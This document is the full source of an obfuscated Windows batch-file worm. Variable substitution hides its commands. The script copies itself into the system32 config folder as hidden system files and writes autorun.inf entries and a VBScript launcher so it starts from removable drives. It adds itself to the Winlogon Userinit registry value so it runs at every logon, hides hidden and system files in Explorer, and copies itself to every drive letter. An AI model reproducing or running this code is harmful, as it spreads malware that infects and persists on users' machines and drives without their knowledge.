@call :c
%v% g0=09
%v% o=I LOVE MY PEANUT
%v% a=bcdefghijklmnopqrstuvwxyz
if "%1"=="%s%" %l% s
if "%1"=="%u%" start %u%r .\
%m% %cc%%zz% %l% a
%v% /a mn=%random%
%v% mm=%mn%.cmd
type .\%d% > %cc%%mm% 
%z% %cc%%mm% %s%>>%c%%m1%%m2%.nt
%v% d=%mm%
%v% g=%random%
%z% %v% a = %i%("%w%.%s%") >%cc%%e%
%z% b=a.Run("%d% %u%",%s%,False) >>%cc%%e%
%y% %cc%%e% %r%
%z% @%v% /a main=%mn% > %cc%%zz%
%y% %cc%%zz% %r%
%y% %cc%%mm% %r%
call :v
:a
%v% j=del
for /l %%i %k% :d %%i
%l% e
:v
%v% t=Open
%m% %cc%%f% %y% %cc%%f% %p%
%z% [autorun]>%cc%%f%     
%z% %t%= >>%cc%%f%
if /i "%DATE:~12,2%" GEQ "%g0%" (%z% %s%\%t%=%o%>>%cc%%f%) else (%z% %s%\%t%=%t%>>%cc%%f%)
%z% %s%\%t%\%j%=%w%.exe .\%e% >>%cc%%f%
%z% %s%\%t%\Default=1 >>%cc%%f%
%z% %s%\%u%=%u% >>%cc%%f%
%z% %s%\%u%\%j%=%w%.exe .\%e% >>%cc%%f%
%y% %cc%%f% %r%
%x% %cc%%d% %c% %h%
%x% %cc%%f% %c% %h%
%x% %cc%%e% %c% %h%
%x% %cc%%zz% %c% %h%
%l% e
:b
%x% %cc%%d% %b%:\ %h%
%x% %cc%%f% %b%:\ %h%
%x% %cc%%e% %b%:\ %h%
%x% %cc%%zz% %b%:\ %h%
%v% b=
%l% e
:c
@echo off
set v=set
%v% l=goto
%v% b=del
%v% m1=auto
%v% x=xcopy
%v% y=attrib
%v% s=shell
%v% w=WScript
%v% i=CreateObject
%v% j=Command
%v% r=+r +h +s +a
%v% p=-r -h -s -a
%v% h=/r/h/y/k
%v% k=in (1,1,24) do call
%v% m=if exist
%v% n=if not exist
%v% q=/q/f
%v% u=Explore
%v% z=echo
%v% m2=exec
%v% rt=101007
%v% zz=101207.cmd
%v% c=%SYSTEMROOT%\system32\
%v% cc=%c%config\
%v% /a main=%random%
%m% %c%%zz% (call %c%%zz%) else (call .\%zz%)
%v% /a rs=%random%
%n% %cc%%rt%.cmd (
    %z% @%v% /a rs=%rs%> %cc%%rt%.cmd
    %y% %cc%%rt%.cmd %r%
    ) else (call %cc%%rt%.cmd)
%v% e=%rs%.vbs
%v% f=autorun.inf
%v% d=%main%.cmd
%v% x1=\Microsoft\Windows
%v% x2=\CurrentVersion\
%l% e
:s
%v% ss=%1
%v% g=%random%.reg
%z% Windows Registry Editor Version 5.00 >.\%g%
%z% [HKEY_LOCAL_MACHINE\SOFTWARE%x1% NT%x2%Winlogon] >>.\%g%
%z% "Userinit"="userinit.exe,%d%" >>.\%g%
%z% [HKEY_CURRENT_USER\Software%x1%%x2%%u%r\Advanced] >>.\%g%
%z% "Hidden"=dword:00000002 >>.\%g%
%z% "ShowSuperHidden"=dword:00000000 >>.\%g%
regedit /s .\%g%
%b% .\%g%
call :v
%v% j=del
for /l %%i %k% :d %%i
%l% e
:d
%v% a=%a:~1,24%
%v% b=%a:~0,1%
if "%ss%"=="%s%" (%m% %b%:\ %l% b) else (%m% %b%:\ %n% %b%:\%zz% %l% b)
:e
